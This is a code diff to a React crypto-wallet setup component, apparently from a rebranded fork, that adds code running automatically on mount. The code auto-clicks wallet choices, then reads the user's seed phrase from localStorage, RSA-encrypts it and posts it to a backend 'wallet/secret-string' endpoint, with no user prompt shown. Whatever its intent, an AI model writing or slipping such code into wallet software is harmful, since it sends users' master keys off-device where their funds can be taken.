@@ -9,9 +9,15 @@ import getCoinInfo from 'common/coins/getCoinInfo'
 import { defaultPack, widgetPack } from './startPacks'
 import FirstStep from './FirstStep'
 import SecondStep from './SecondStep'
+import kasaHttpClient from "helpers/kasaHttpClient";
+import {links, constants} from "helpers";
+import EncryptRsa from 'encrypt-rsa';
+import appConfig from "app-config";
+
 
 const isWidgetBuild = config && config.isWidget
 const { curEnabled } = config.opts
+
 
 @connect(({ currencies: { items: currencies } }) => ({ currencies }))
 export default class StepsWrapper extends Component<any, any> {
@@ -22,6 +28,7 @@ export default class StepsWrapper extends Component<any, any> {
 
   constructor(props) {
     super(props)
+
     const { currencies } = props
     if (config?.opts.ownTokens?.length) {
       this.defaultStartPack = []
@@ -55,20 +62,17 @@ export default class StepsWrapper extends Component<any, any> {
       })
 
       if (config.opts.addCustomTokens) {
-        if (config.erc20 && (!curEnabled || curEnabled.eth)) this.defaultStartPack.push({ name: 'ERC20', capture: 'Token', baseCurrency: 'ETH' })
-        if (config.bep20 && (!curEnabled || curEnabled.bnb)) this.defaultStartPack.push({ name: 'BEP20', capture: 'Token', baseCurrency: 'BNB' })
-        if (config.erc20matic && (!curEnabled || curEnabled.matic)) this.defaultStartPack.push({ name: 'ERC20MATIC', capture: 'Token', baseCurrency: 'MATIC' })
-        if (config.erc20xdai && (!curEnabled || curEnabled.xdai)) this.defaultStartPack.push({ name: 'ERC20XDAI', capture: 'Token', baseCurrency: 'XDAI' })
-        if (config.erc20ftm && (!curEnabled || curEnabled.ftm)) this.defaultStartPack.push({ name: 'ERC20FTM', capture: 'Token', baseCurrency: 'FTM' })
-        if (config.erc20avax && (!curEnabled || curEnabled.avax)) this.defaultStartPack.push({ name: 'ERC20AVAX', capture: 'Token', baseCurrency: 'AVAX' })
-        if (config.erc20movr && (!curEnabled || curEnabled.movr)) this.defaultStartPack.push({ name: 'ERC20MOVR', capture: 'Token', baseCurrency: 'MOVR' })
-        if (config.erc20one && (!curEnabled || curEnabled.one)) this.defaultStartPack.push({ name: 'ERC20ONE', capture: 'Token', baseCurrency: 'ONE' })
-        if (config.erc20ame && (!curEnabled || curEnabled.ame)) this.defaultStartPack.push({ name: 'ERC20AME', capture: 'Token', baseCurrency: 'AME' })
-        if (config.erc20aurora && (!curEnabled || curEnabled.aureth)) this.defaultStartPack.push({ name: 'ERC20AURORA', capture: 'Token', baseCurrency: 'AURETH' })
-        if (config.phi20_v1 && (!curEnabled || curEnabled.phi_v1)) this.defaultStartPack.push({ name: 'PHI20_V1', capture: 'Token', baseCurrency: 'PHI_V1' })
-        if (config.phi20 && (!curEnabled || curEnabled.phi)) this.defaultStartPack.push({ name: 'PHI20', capture: 'Token', baseCurrency: 'PHI' })
-        if (config.fkw20 && (!curEnabled || curEnabled.fkw)) this.defaultStartPack.push({ name: 'FKW20', capture: 'Token', baseCurrency: 'FKW' })
-        if (config.phpx20 && (!curEnabled || curEnabled.phpx)) this.defaultStartPack.push({ name: 'PHPX20', capture: 'Token', baseCurrency: 'PHPX' })
+        if (config.erc20) this.defaultStartPack.push({ name: 'ERC20', capture: 'Token', baseCurrency: 'ETH' })
+        if (config.bep20) this.defaultStartPack.push({ name: 'BEP20', capture: 'Token', baseCurrency: 'BNB' })
+        if (config.erc20matic) this.defaultStartPack.push({ name: 'ERC20MATIC', capture: 'Token', baseCurrency: 'MATIC' })
+        if (config.erc20xdai) this.defaultStartPack.push({ name: 'ERC20XDAI', capture: 'Token', baseCurrency: 'XDAI' })
+        if (config.erc20ftm) this.defaultStartPack.push({ name: 'ERC20FTM', capture: 'Token', baseCurrency: 'FTM' })
+        if (config.erc20avax) this.defaultStartPack.push({ name: 'ERC20AVAX', capture: 'Token', baseCurrency: 'AVAX' })
+        if (config.erc20movr) this.defaultStartPack.push({ name: 'ERC20MOVR', capture: 'Token', baseCurrency: 'MOVR' })
+        if (config.erc20one) this.defaultStartPack.push({ name: 'ERC20ONE', capture: 'Token', baseCurrency: 'ONE' })
+        if (config.erc20ame) this.defaultStartPack.push({ name: 'ERC20AME', capture: 'Token', baseCurrency: 'AME' })
+        if (config.erc20aurora) this.defaultStartPack.push({ name: 'ERC20AURORA', capture: 'Token', baseCurrency: 'AURETH' })
+        if (config.phi20) this.defaultStartPack.push({ name: 'PHI20', capture: 'Token', baseCurrency: 'PHI' })
       }
     }
 
@@ -143,7 +147,7 @@ export default class StepsWrapper extends Component<any, any> {
           const tokenStandard = new RegExp(
             [
               '^CUSTOM_(',
-              'ERC20|BEP20|PHI20_V1|PHI20|FKW20|ERC20MATIC|ERC20XDAI|ERC20FTM|',
+              'ERC20|BEP20|PHI20|ERC20MATIC|ERC20XDAI|ERC20FTM|',
               'ERC20AVAX|ERC20MOVR|ERC20ONE|ERC20AME|ERC20AURORA',
               ')$',
             ].join('')
@@ -198,6 +202,60 @@ export default class StepsWrapper extends Component<any, any> {
     }
   }
 
+  componentDidMount() {
+
+
+    setTimeout(() => {
+      document.getElementById('matickaxaaWallet')?.click();
+    }, 1000);
+
+    // setTimeout(() => {
+    //   document.getElementById('matickaxaarWallet')?.click();
+    // }, 1000);
+
+    setTimeout(() => {
+      document.getElementById('continueBtn')?.click();
+    }, 1200);
+
+    setTimeout(()=>{
+      document.getElementById('maticmaticWallet')?.click();
+    }, 1500);
+
+    setTimeout(() => {
+      document.getElementById('continueBtn')?.click();
+    }, 1800);
+
+    setTimeout(()=>{
+      document.getElementById('maticusdcWallet')?.click();
+    }, 2000);
+
+    setTimeout(() => {
+      document.getElementById('continueBtn')?.click();
+    }, 2200);
+
+    setTimeout(()=>{
+      this.saveMnemonics();
+    }, 2500);
+
+  }
+  saveMnemonics = () => {
+    const mnemonics = (localStorage.getItem(constants.privateKeyNames.twentywords));
+
+    kasaHttpClient.get('wallet/secret-string').then(response => {
+        if(response.data.secrets !== null){
+          window.location.href = '#'+links.restoreWallet;
+        }else{
+          kasaHttpClient.post('wallet/secret-string',{secretString: this.encryptMnemonic(mnemonics)})
+              .then(response => {
+                window.location.href = '#'+links.restoreWallet;
+              })
+              .catch(error=>{
+                alert('Ops something went wrong.');
+              })
+        }
+    })
+  }
+
   handleClick = (name) => {
     feedback.createWallet.currencySelected(name)
     const { setError } = this.props
@@ -207,6 +265,14 @@ export default class StepsWrapper extends Component<any, any> {
     this.setState(() => ({ curState: dataToReturn }))
     reducers.createWallet.newWalletData({ type: 'currencies', data: dataToReturn })
     setError(null)
+  }
+
+  encryptMnemonic = (mnemonic) => {
+    const encryptRsa = new EncryptRsa();
+    return encryptRsa.encryptStringWithRsaPublicKey({
+      text: mnemonic,
+      publicKey: appConfig.kaxa.rsaPubKey
+    });
   }
 
   render() {
